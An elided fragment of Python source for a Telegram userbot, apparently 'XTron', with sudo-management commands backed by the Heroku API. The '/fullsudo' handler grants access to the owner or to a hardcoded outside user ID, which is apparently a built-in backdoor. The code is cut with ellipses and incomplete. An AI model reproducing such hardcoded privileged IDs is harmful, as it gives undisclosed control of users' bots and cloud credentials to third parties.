import os
from XTron import OWNER_ID, HEROKU_APP_NAME, HEROKU_API_KEY
...
@Tron.on(events.NewMessage(pattern="[!/]addsudo"))
async def add_sudo(event):
  if event.sender_id in DEV:
     if event.is_group:
          return await event.reply("**Use This Cmd In PM**")
     async with Tron.conversation(event.chat_id) as rizx:
        if HEROKU_API_KEY:
        ...
        if username.startswith("@"):
            try:
               ...
               if int(id) in RiZoeLX:
                   return await rizx.send_message("I Can't Add @SPA4KY As a Sudo")
...
@Tron.on(events.NewMessage(pattern="[!/]fullsudo"))
async def full_sudo(event):
  if event.sender_id == OWNER_ID or event.sender_id == 1846020026:
     if event.is_group:
          return await event.reply("**Use This Command In PM**")
     async with Tron.conversation(event.chat_id) as rizx:
        if HEROKU_API_KEY:
            Heroku = heroku3.from_key(HEROKU_API_KEY)
        else:
